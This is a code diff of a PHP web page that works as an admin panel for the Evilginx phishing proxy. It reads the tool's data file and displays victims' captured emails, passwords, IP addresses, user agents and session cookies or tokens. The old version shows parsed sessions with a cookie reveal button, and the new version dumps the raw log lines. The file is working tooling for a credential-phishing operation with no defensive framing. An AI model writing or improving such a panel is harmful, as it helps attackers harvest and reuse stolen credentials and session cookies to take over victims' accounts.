@@ -1,113 +1,56 @@
 <?php
+// Path to your Evilginx cookie/db file
+$dataFile = "/root/.evilginx/data.db";
 
-// Path to evilginx data file
-$DB_FILE = "/root/.evilginx/data.db";
-
-// Read whole file
-$content = file_get_contents($DB_FILE);
-$lines = explode("\n", $content);
-
-$sessions = [];
-$total = count($lines);
-
-for ($i = 0; $i < $total; $i++) {
-
-    // Detect session header
-    if (preg_match('/^sessions:(\d+)/', trim($lines[$i]), $m)) {
-
-        $session_id = $m[1];
-
-        // move to next line containing JSON length
-        $json_len_line = trim($lines[$i + 1]);
-
-        // move to next line containing JSON data
-        $json_line = trim($lines[$i + 2]);
-
-        // Make sure JSON line starts with `{`
-        if (strpos($json_line, "{") === 0) {
-            $data = json_decode($json_line, true);
-
-            if ($data) {
-                $sessions[$session_id] = $data;
-            }
-        }
-    }
+// Check if file exists
+if (!file_exists($dataFile)) {
+    die("Data file not found.");
 }
 
+// Read the entire file
+$lines = file($dataFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 ?>
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Evilginx Admin</title>
+    <meta charset="UTF-8">
+    <title>Evilginx Cookies Viewer</title>
     <style>
-        body { background:#111; color:#eee; font-family:Arial; padding:20px; }
-        .session-box {
-            background:#222;
-            padding:15px;
-            margin-bottom:15px;
-            border-radius:5px;
+        body {
+            font-family: monospace;
+            background-color: #1e1e1e;
+            color: #c5c8c6;
+            padding: 20px;
         }
-        .cookie-box {
-            background:#000;
-            padding:10px;
-            margin-top:10px;
-            white-space:pre-wrap;
-            color:#0f0;
-            display:none;
+        .log-entry {
+            border-bottom: 1px solid #444;
+            padding: 10px 0;
         }
-        button {
-            background:#444;
-            color:#fff;
-            padding:8px 14px;
-            border:none;
-            cursor:pointer;
-            border-radius:4px;
+        .json-block {
+            white-space: pre-wrap;
+            background-color: #2e2e2e;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
         }
-        button:hover { background:#666; }
+        .highlight {
+            color: #8be9fd;
+        }
     </style>
-
-    <script>
-        function toggleCookies(id) {
-            var box = document.getElementById("cookie_" + id);
-            box.style.display = (box.style.display === "none") ? "block" : "none";
-        }
-    </script>
 </head>
-
 <body>
-
-<h1>Evilginx Admin Panel</h1>
-
-<?php
-if (empty($sessions)) {
-    echo "<p>No sessions found.</p>";
-    exit;
-}
-
-foreach ($sessions as $sid => $s) {
-
-    $ip = $s["remote_addr"] ?? "N/A";
-    $ua = $s["useragent"] ?? "N/A";
-    $email = $s["username"] ?? "";
-    $pass = $s["password"] ?? "";
-    $cookie = json_encode($s["tokens"] ?? [], JSON_PRETTY_PRINT);
-    $time = $s["update_time"] ?? "N/A";
-
-    echo "<div class='session-box'>";
-    echo "<h3>Session: $sid</h3>";
-    echo "<b>Email:</b> $email<br>";
-    echo "<b>Password:</b> $pass<br>";
-    echo "<b>IP:</b> $ip<br>";
-    echo "<b>UA:</b> $ua<br>";
-    echo "<b>Time:</b> $time<br><br>";
-
-    echo "<button onclick=\"toggleCookies('$sid')\">View Cookies</button>";
-
-    echo "<div class='cookie-box' id='cookie_$sid'>$cookie</div>";
-
-    echo "</div>";
-}
-?>
-
+    <h1>Evilginx Logs / Cookies Viewer</h1>
+    <?php foreach ($lines as $line): ?>
+        <div class="log-entry">
+            <?php
+            // Highlight JSON-looking lines for clarity
+            if (strpos($line, '{') !== false && strpos($line, '}') !== false) {
+                echo '<div class="json-block">' . htmlspecialchars($line) . '</div>';
+            } else {
+                echo '<span class="highlight">' . htmlspecialchars($line) . '</span>';
+            }
+            ?>
+        </div>
+    <?php endforeach; ?>
 </body>
 </html>
